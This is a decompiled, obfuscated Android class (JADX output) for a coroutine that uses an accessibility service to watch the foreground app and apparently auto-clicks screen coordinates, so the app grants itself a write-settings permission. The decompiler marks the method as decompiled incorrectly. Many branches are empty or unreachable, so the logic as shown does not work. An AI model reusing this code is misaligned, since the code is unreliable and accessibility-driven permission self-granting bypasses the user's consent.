package com.storm.safe.rock.service.modules;

import android.view.accessibility.AccessibilityNodeInfo;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import org.conscrypt.PSKKeyManager;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$startCoordinateClickDetection$1", m214403f = "WriteSettingsPermissionManager.kt", m214404l = {230, 254, PSKKeyManager.MAX_KEY_LENGTH_BYTES}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class WriteSettingsPermissionManager$startCoordinateClickDetection$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public AccessibilityNodeInfo f52990a1;

    /* renamed from: a2 */
    public int f52991a2;

    /* renamed from: a3 */
    public int f52992a3;

    /* renamed from: a4 */
    public int f52993a4;

    /* renamed from: a5 */
    public /* synthetic */ Object f52994a5;

    /* renamed from: a6 */
    public final /* synthetic */ C0327b2 f52995a6;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public WriteSettingsPermissionManager$startCoordinateClickDetection$1(C0327b2 c0327b2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52995a6 = c0327b2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        WriteSettingsPermissionManager$startCoordinateClickDetection$1 writeSettingsPermissionManager$startCoordinateClickDetection$1 = new WriteSettingsPermissionManager$startCoordinateClickDetection$1(this.f52995a6, interfaceC0876mv);
        writeSettingsPermissionManager$startCoordinateClickDetection$1.f52994a5 = obj;
        return writeSettingsPermissionManager$startCoordinateClickDetection$1;
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((WriteSettingsPermissionManager$startCoordinateClickDetection$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Can't wrap try/catch for region: R(9:68|69|81|70|19|(3:24|(2:27|(4:30|(8:32|(1:39)|40|(1:42)(1:43)|44|(4:46|(2:51|(2:53|(1:55)))|56|(4:59|60|(1:62)|69))|81|70)|19|(3:21|24|(0)))(1:29))|64)|(2:74|76)|77|78) */
    /* JADX WARN: Code restructure failed: missing block: B:37:0x009f, code lost:
    
        r7 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:38:0x00a0, code lost:
    
        r8 = r13;
     */
    /* JADX WARN: Code restructure failed: missing block: B:63:0x0124, code lost:
    
        if (r13 == r0) goto L64;
     */
    /* JADX WARN: Code restructure failed: missing block: B:72:0x0138, code lost:
    
        p000.t60.m214705c6("WriteSettingsPerm", "❌ 坐标点击检测失败", r7);
        r13 = r8;
     */
    /* JADX WARN: Path cross not found for [B:19:0x0051, B:32:0x0092], limit reached: 78 */
    /* JADX WARN: Path cross not found for [B:81:0x0133, B:46:0x00c6], limit reached: 78 */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0057  */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0078 A[PHI: r1 r6 r13
      0x0078: PHI (r1v4 int) = (r1v5 int), (r1v12 int) binds: [B:25:0x0074, B:17:0x003a] A[DONT_GENERATE, DONT_INLINE]
      0x0078: PHI (r6v3 int) = (r6v5 int), (r6v11 int) binds: [B:25:0x0074, B:17:0x003a] A[DONT_GENERATE, DONT_INLINE]
      0x0078: PHI (r13v11 no) = (r13v14 no), (r13v28 no) binds: [B:25:0x0074, B:17:0x003a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0081  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0088 A[Catch: Exception -> 0x009f, TRY_ENTER, TryCatch #1 {Exception -> 0x009f, blocks: (B:70:0x0133, B:30:0x0088, B:32:0x0092, B:34:0x0098, B:40:0x00a6, B:42:0x00b0, B:44:0x00c0, B:46:0x00c6, B:48:0x00cc, B:51:0x00d3, B:53:0x00e1, B:55:0x00ec, B:56:0x00f2, B:43:0x00b8), top: B:81:0x0133 }] */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0110 A[Catch: Exception -> 0x0020, TryCatch #0 {Exception -> 0x0020, blocks: (B:8:0x001b, B:65:0x0127, B:68:0x0130, B:60:0x0108, B:62:0x0110, B:15:0x0035), top: B:79:0x0009 }] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0144  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:31:0x0090 -> B:19:0x0051). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:45:0x00c4 -> B:81:0x0133). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:52:0x00df -> B:81:0x0133). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:54:0x00ea -> B:19:0x0051). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x010e -> B:69:0x0132). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:63:0x0124 -> B:65:0x0127). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        InterfaceC0920no interfaceC0920no;
        int i;
        InterfaceC0920no interfaceC0920no2;
        AccessibilityNodeInfo rootInActiveWindow;
        String string;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = this.f52993a4;
        try {
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 坐标点击检测失败", e);
            interfaceC0920no = interfaceC0920no2;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            interfaceC0920no = (InterfaceC0920no) this.f52994a5;
            i = 0;
            i2 = 10;
            if (this.f52995a6.f53169a3) {
            }
            if (i >= i2) {
            }
            return C1351vv.f60710b1;
        }
        if (i2 == 1) {
            i2 = this.f52992a3;
            i = this.f52991a2;
            InterfaceC0920no interfaceC0920no3 = (InterfaceC0920no) this.f52994a5;
            kg1.m213544f4(obj);
            interfaceC0920no = interfaceC0920no3;
            i++;
            if (this.f52995a6.m211734d5()) {
            }
            if (i >= i2) {
            }
            return C1351vv.f60710b1;
        }
        if (i2 == 2) {
            i2 = this.f52992a3;
            i = this.f52991a2;
            rootInActiveWindow = this.f52990a1;
            interfaceC0920no2 = (InterfaceC0920no) this.f52994a5;
            kg1.m213544f4(obj);
            if (((Boolean) obj).booleanValue()) {
            }
            interfaceC0920no = interfaceC0920no2;
            C0327b2.m211711f4(rootInActiveWindow);
            if (this.f52995a6.f53169a3) {
            }
            if (i >= i2) {
            }
            return C1351vv.f60710b1;
        }
        if (i2 != 3) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        i2 = this.f52992a3;
        i = this.f52991a2;
        rootInActiveWindow = this.f52990a1;
        interfaceC0920no2 = (InterfaceC0920no) this.f52994a5;
        kg1.m213544f4(obj);
        if (((Boolean) obj).booleanValue()) {
            if (i >= i2 && this.f52995a6.f53169a3) {
                this.f52995a6.f53176b0 = WriteSettingsPermissionManager$DeviceStrategy.f52896a1;
                this.f52995a6.m211750f6();
            }
            return C1351vv.f60710b1;
        }
        int i3 = C0327b2.f53165c0;
        interfaceC0920no = interfaceC0920no2;
        C0327b2.m211711f4(rootInActiveWindow);
        if (this.f52995a6.f53169a3 && AbstractC0780a0.m213691a2(interfaceC0920no.mo210226a1()) && i < i2) {
            this.f52994a5 = interfaceC0920no;
            this.f52990a1 = null;
            this.f52991a2 = i;
            this.f52992a3 = i2;
            this.f52993a4 = 1;
            if (b81.m210571b1(500L, this) != coroutineSingletons) {
                i++;
                if (this.f52995a6.m211734d5()) {
                    this.f52995a6.m211741e6();
                } else {
                    rootInActiveWindow = this.f52995a6.f53166a0.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        CharSequence packageName = rootInActiveWindow.getPackageName();
                        if (packageName == null || (string = packageName.toString()) == null) {
                            string = "";
                        }
                        if (string.equals(this.f52995a6.f53174a8)) {
                            this.f52995a6.f53175a9++;
                        } else {
                            this.f52995a6.f53175a9 = 1;
                            this.f52995a6.f53174a8 = string;
                        }
                        if (this.f52995a6.f53175a9 >= 2) {
                            if (!C0327b2.m211708e0(string) && !C0327b2.m211707d8(string)) {
                                if (string.equals(this.f52995a6.f53167a1.getPackageName())) {
                                    C0327b2.m211711f4(rootInActiveWindow);
                                    if (this.f52995a6.m211734d5()) {
                                        this.f52995a6.m211741e6();
                                    }
                                }
                            }
                            C0327b2 c0327b2 = this.f52995a6;
                            this.f52994a5 = interfaceC0920no;
                            this.f52990a1 = rootInActiveWindow;
                            this.f52991a2 = i;
                            this.f52992a3 = i2;
                            this.f52993a4 = 2;
                            Object objM211714a3 = c0327b2.m211714a3(this);
                            if (objM211714a3 != coroutineSingletons) {
                                interfaceC0920no2 = interfaceC0920no;
                                obj = objM211714a3;
                                if (((Boolean) obj).booleanValue()) {
                                    C0327b2 c0327b22 = this.f52995a6;
                                    this.f52994a5 = interfaceC0920no2;
                                    this.f52990a1 = rootInActiveWindow;
                                    this.f52991a2 = i;
                                    this.f52992a3 = i2;
                                    this.f52993a4 = 3;
                                    int i4 = C0327b2.f53165c0;
                                    obj = c0327b22.m211755g2(10, 1000L, this);
                                }
                                interfaceC0920no = interfaceC0920no2;
                            }
                        }
                        C0327b2.m211711f4(rootInActiveWindow);
                    }
                    if (this.f52995a6.f53169a3) {
                        this.f52994a5 = interfaceC0920no;
                        this.f52990a1 = null;
                        this.f52991a2 = i;
                        this.f52992a3 = i2;
                        this.f52993a4 = 1;
                        if (b81.m210571b1(500L, this) != coroutineSingletons) {
                        }
                    }
                }
            }
            return coroutineSingletons;
        }
        if (i >= i2) {
            this.f52995a6.f53176b0 = WriteSettingsPermissionManager$DeviceStrategy.f52896a1;
            this.f52995a6.m211750f6();
        }
        return C1351vv.f60710b1;
    }
}
